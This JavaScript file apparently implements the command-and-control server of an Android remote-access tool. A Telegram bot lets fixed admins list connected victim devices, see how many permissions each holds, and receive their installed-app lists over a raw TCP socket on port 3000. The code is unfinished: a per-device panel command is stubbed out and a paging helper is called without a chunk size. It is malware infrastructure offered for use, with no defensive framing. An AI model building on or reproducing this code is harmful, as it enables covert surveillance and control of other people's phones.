const token  = "";
const chat   = 0;
const admins = [ 0, 0, 0 ];

const TelegramBot = require("node-telegram-bot-api");
const crypto = require("crypto");
const net = require("net");

const makeFont = (string) => {
    const translationMap = {
        'q': 'Q', 'w': 'ᴡ', 'e': 'ᴇ', 'r': 'ʀ', 't': 'ᴛ',
        'y': 'ʏ', 'u': 'ᴜ', 'i': 'ɪ', 'o': 'ᴏ', 'p': 'ᴘ',
        'a': 'ᴀ', 's': 'ꜱ', 'd': 'ᴅ', 'f': 'ꜰ', 'g': 'ɢ',
        'h': 'ʜ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'z': 'ᴢ',
        'x': 'x', 'c': 'ᴄ', 'v': 'ᴠ', 'b': 'ʙ', 'n': 'ɴ',
        'm': 'ᴍ'
    };

    return string.split('').map(char => translationMap[char] || char).join('');
}

function chunkArray(array, chunkSize) {
    const result = [];
    for (let i = 0; i < array.length; i += chunkSize) {
        const chunk = array.slice(i, i + chunkSize);
        result.push(chunk);
    }
    return result;
}

const bot = new TelegramBot(token, { polling: true })
const clients = [];
const jsclients = [];
const server = net.createServer(async (socket) => {
    socket.on("data", async (body) => {
        try{
            const data = JSON.parse(body);
            if (data.method == "connect"){
                if (!clients.includes(socket)){
                    clients.push(socket);
                    jsclients.push({
                        client: socket,
                        accessory: data.result
                    });
                }
            } else if (data.method == "getApplications"){
                let apps = data.result;
                let string = '';
                for (let app of apps){
                    string += makeFont(`📃 name: ${app.name}\n🎫 package: ${app.package}\n---------\n`);
                }
                try{
                    await bot.editMessageText(
                        `🥤 | اپلیکیشن های دانلود شده:\n${string}`,
                        {
                            chat_id: data.chat_id,
                            message_id: data.message_id
                        }
                    )
                } catch (e) {
                    await bot.sendMessage(data.chat_id, `🥤 | اپلیکیشن های دانلود شده:\n${string}`)
                }
            }
        } catch (e){
            console.log("🔴 Error:", e)
        }
    })

    socket.on("end", () => {
        console.log(`🔓 Client ${socket.remoteAddress} disconnected`);
        delete clients[clients.indexOf(socket)];
        let i = 0;
        for (let cli of jsclients){
            if (cli.client.remoteAddress == socket.remoteAddress){
                delete jsclients[i];
            } else {
                i += 1;
            }
        }
    })
})

server.listen(3000, "0.0.0.0", () => {
    console.log("✅ Socket-Server is online");
})

let objs = {
    first_name: null,
    bid: null
}

bot.getMe().then((b) => {
    objs.first_name = b.first_name;
    objs.bid = b.id
})

bot.on("message", async (msg) => {
    if (msg.chat.id == chat && admins.includes(msg.from.id)){
        if (msg.text.startsWith("/start")){
            await bot.sendMessage(
                msg.chat.id,
                makeFont(`🌊 | remote is online and active on `) + `<a href="tg://openmessage?user_id=${objs.bid}"></a>\n`,
                {
                    parse_mode: "HTML",
                    reply_to_message_id: msg.message_id,
                    reply_markup: {
                        inline_keyboard: [
                            [
                                {
                                    text: makeFont("users 👥"),
                                    callback_data: `getUsers_${msg.from.id}_0`
                                }
                            ]
                        ]
                    }
                }
            )
        } // else if (msg.text.startsWith("/panel")){}
    }
})

bot.on('callback_query', async (call) => {
    let spl = call.data.split("_");
    let uid = parseInt(spl[1]);
    if (admins.includes(call.from.id)){
        if (uid == call.from.id){
            if (call.data.startsWith("getUsers")){
                let pid = parseInt(spl[2]);
                let clis = chunkArray(jsclients);
                let str = makeFont(`📃 | page ${pid}/${clis.length}\n👥 | users are ${jsclients.length}`);
                for (let cli of clis[pid]){
                    str += `\n\n👤 | <code>/panel_${crypto.createHash("md5").update(cli.client.remoteAddress).digest('hex').slice(0, 8)}</code>\n` + makeFont(`➕ | has ${cli.accessory.length} access`);
                }
                
                let fLayer = [];

                if (pid != 0){
                    fLayer.push({
                        text: makeFont("⏮ previous"),
                        callback_data: `getUsers_${call.from.id}_${pid-1}`
                    })
                }

                if (pid != clis.length){
                    fLayer.push({
                        text: makeFont("next ⏭"),
                        callback_data: `getUsers_${call.from.id}_${pid+1}`
                    })
                }

                await bot.sendMessage(
                    call.message.chat.id,
                    str,
                    {
                        parse_mode: "HTML",
                        reply_to_message_id: call.message.message_id,
                        reply_markup: {
                            inline_keyboard: [
                                fLayer,
                                [
                                    {
                                        text: makeFont('close'),
                                        callback_data: `close_${call.from.id}`
                                    }
                                ]
                            ]
                        }
                    }
                )
            } else if (call.data.startsWith("close")){
                try{await bot.deleteMessage(call.message.chat.id, call.message.message_id);}
                catch (e){}
            }
        }
    }
})